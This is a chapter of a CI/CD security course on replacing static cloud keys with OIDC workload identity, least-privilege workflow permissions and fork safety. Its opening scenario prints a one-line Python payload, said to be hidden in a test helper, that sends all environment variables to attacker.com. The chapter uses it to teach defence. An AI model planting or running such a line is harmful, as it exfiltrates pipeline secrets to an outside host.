# Part XI: Authentication & Pipeline Security (Phases 75–83)

## Motto
> "A CI runner is an execution engine holding pre-authorized cloud privileges. Never pass static credentials to pipelines — use short-lived OIDC workload identity, enforce least privilege, and guard fork trust boundaries."

---

## Delivery Problem
A project stores a permanent AWS access key (`AKIA...`) in repository secrets with `AdministratorAccess`. An open-source contributor submits a pull request with a seemingly innocent unit test fix. 

Inside `test_helper.py`, the contributor added a single line:
```python
import os, urllib.request; urllib.request.urlopen("https://attacker.com?c=" + str(dict(os.environ)))
```
Because the workflow checked out the PR head and ran tests with access to secrets, the attacker exfiltrated the permanent administrator credentials within 30 seconds!

---

## Prediction
1. Permanent cloud credentials stored in CI secrets will eventually be exposed via verbose logs, malicious pull requests, or compromised dependencies.
2. Short-lived OIDC tokens eliminate static secrets because they expire automatically after 15 minutes.
3. Restricting workflow permissions to empty by default prevents compromised jobs from modifying repository contents or creating unauthorized releases.

---

## First Principles
1. **CI as High-Trust Attack Surface**:
   A delivery pipeline is a trusted automation bridge connecting external code to internal production infrastructure. If an attacker gains command execution inside a privileged runner, they inherit the runner's IAM authority.
2. **Workload Identity Federation (OIDC)**:
   Instead of storing permanent API keys:
   - The CI runner generates a cryptographically signed JWT with verified identity claims (`repository`, `ref`, `workflow`).
   - The cloud provider's Security Token Service (STS) validates the token against the CI platform's public cryptographic keys.
   - The cloud provider issues temporary, short-lived session credentials scoped strictly to the trust policy.
3. **The Least Privilege Default**:
   Every workflow must explicitly declare `permissions: {}` at the top level. Individual jobs only request the specific scopes they require (e.g. `contents: read`, `id-token: write`).

---

## Manual Process (Phase 77: OIDC Token Exchange Simulation)
Execute the OIDC simulator locally:

```bash
python3 security-labs/oidc_simulator.py
```

Observe how:
- Scenario 1 (Legitimate workflow on `main`) succeeds and receives temporary credentials.
- Scenario 2 (Untrusted external fork) is denied by the cloud trust policy.
- Scenario 3 (Feature branch attempting production role) is rejected.

---

## Mental Model

```text
[ CI Runner ]
      │
      ▼ Requests Identity Token
[ GitHub OIDC Token Service ]
      │
      ▼ Signs JWT (claims: repo, branch, commit)
[ Signed OIDC JWT Token ]
      │
      ▼ Exchanged with Cloud STS (AssumeRoleWithWebIdentity)
[ Cloud Security Token Service (AWS/GCP) ]
      │
      ▼ Validates Claims against IAM Trust Policy
[ Short-Lived Temporary Credentials (TTL: 15 mins) ]
```

---

## Automate It (Phase 77, 79: GitHub Actions OIDC Configuration)

```yaml
jobs:
  deploy-to-cloud:
    runs-on: ubuntu-24.04
    permissions:
      contents: read
      id-token: write # Required for requesting OIDC JWT token (Phase 77)
    steps:
      - uses: actions/checkout@v4.1.7

      - name: Authenticate to AWS via OIDC
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::123456789012:role/ProductionDeployerRole
          aws-region: us-east-1
          audience: sts.amazonaws.com
```

---

## Run It
Run `security-labs/oidc_simulator.py` to inspect the claims and temporary access tokens:

```bash
python3 security-labs/oidc_simulator.py
```

---

## Break It (Phase 83: Secret Exfiltration Lab)
1. Run broken lab `15-fork-pr-exfiltrating-ci-secret`:
   ```bash
   python3 broken-pipelines/15-fork-pr-exfiltrating-ci-secret/reproduce_failure.py
   ```
2. Run broken lab `16-overprivileged-ci-runner-token`:
   ```bash
   python3 broken-pipelines/16-overprivileged-ci-runner-token/reproduce_failure.py
   ```
3. Run broken lab `17-unpinned-third-party-action-supply-chain-tamper`:
   ```bash
   python3 broken-pipelines/17-unpinned-third-party-action-supply-chain-tamper/reproduce_failure.py
   ```

---

## Debug It
When an OIDC exchange fails:
- Inspect the error message: `Not authorized to perform sts:AssumeRoleWithWebIdentity`.
- Check whether the repository claim (`repo:org/repo`) or ref claim (`ref:refs/heads/main`) matches the IAM trust policy condition.
- Verify that `permissions: id-token: write` is declared on the job.

---

## Security
- **Pin Actions to Commit SHAs**:
  ```yaml
  uses: actions/checkout@692973e3d937129bcbf40652eb9f2f61becf3332 # v4.1.7
  ```
- **Never Checkout Untrusted Forks in Privileged Workflows**:
  Avoid running `pull_request_target` with head checkouts.

---

## Optimize It
- Shorten OIDC session durations: configure temporary credentials to expire in 15 minutes rather than 1 hour.

---

## Deployment Implication
Using OIDC and least privilege guarantees that even if a build job or test dependency is compromised, the attacker cannot pivot into production cloud infrastructure.

---

## Recovery
If a credential is leaked or suspected compromised:
1. Invalidate active STS sessions immediately via IAM console or CLI.
2. If static keys were used, delete the IAM access key instantly.
3. Review CloudTrail audit logs for IP addresses that used the stolen token.

---

## Practical Exercises (Part XI)
1. **Exercise 11.1**: Decode a sample JWT token using Python's `base64` library and inspect its header and claims payload.
2. **Exercise 11.2**: Write an IAM trust policy JSON document that allows OIDC authentication only for workflow runs on `refs/heads/main`.
3. **Exercise 11.3**: Simulate a malicious unit test trying to read `os.environ` and demonstrate how sanitizing environment variables blocks exfiltration.
4. **Exercise 11.4**: Audit `.github/workflows/` and identify any job with excessive default write permissions.
5. **Exercise 11.5**: Write a script that checks third-party action references and warns if any action is pinned to a mutable tag instead of a 40-character commit SHA.
6. **Exercise 11.6**: Configure a mock cloud STS that issues credentials with an expiration timestamp and rejects expired tokens.
7. **Exercise 11.7**: Demonstrate how self-hosted runner persistent workspaces can leak files across consecutive jobs.
8. **Exercise 11.8**: Write an automated scanner that searches runner logs for token patterns and alerts on unmasked credentials.

---

## Questions for Mastery
1. *Why is OIDC Workload Identity inherently more secure than storing static AWS access keys in GitHub Secrets?*
2. *Why is using `pull_request_target` with an untrusted PR head checkout considered a critical security vulnerability?*
3. *Why should third-party actions in production release workflows be pinned to commit SHAs rather than version tags?*

---

## What Comes Next
In **Part XII (Phases 84–91)**, we examine the Software Supply Chain: checksums, SBOM generation, SLSA provenance attestation, cryptographic signing with Cosign, and dependency pinning.
